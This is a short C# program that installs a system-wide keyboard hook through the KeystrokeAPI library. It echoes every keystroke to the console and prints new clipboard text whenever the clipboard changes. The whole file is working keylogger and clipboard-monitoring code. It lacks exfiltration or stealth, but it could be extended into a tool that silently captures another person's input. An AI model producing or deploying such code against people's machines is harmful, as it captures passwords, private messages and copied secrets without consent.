using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Keystroke.API;

namespace clipclient
{
    // REF: https://github.com/fabriciorissetto/KeystrokeAPI/blob/master/Keystroke.ConsoleAppTest/Program.cs
    class Program
    {
        /*
         * Current thread must be set to single thread apartment (STA) mode before OLE calls can be made. 
         * Ensure that your Main function has STAThreadAttribute marked on it.
         */
        [STAThread]
        static void Main(string[] args)
        {
            string ClipboardContent = "";

            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => {
                Console.Write(character);

                if (Clipboard.ContainsText())
                {
                    if (ClipboardContent != Clipboard.GetText())
                    {
                        ClipboardContent = Clipboard.GetText();
                            Console.WriteLine(ClipboardContent);
                        }
                    }
                });
                //This call starts the windows message loop for you, but you will need to reference the 
                //System.Windows.Forms.dll in your project.
                Application.Run();
            }
        }
    }
}
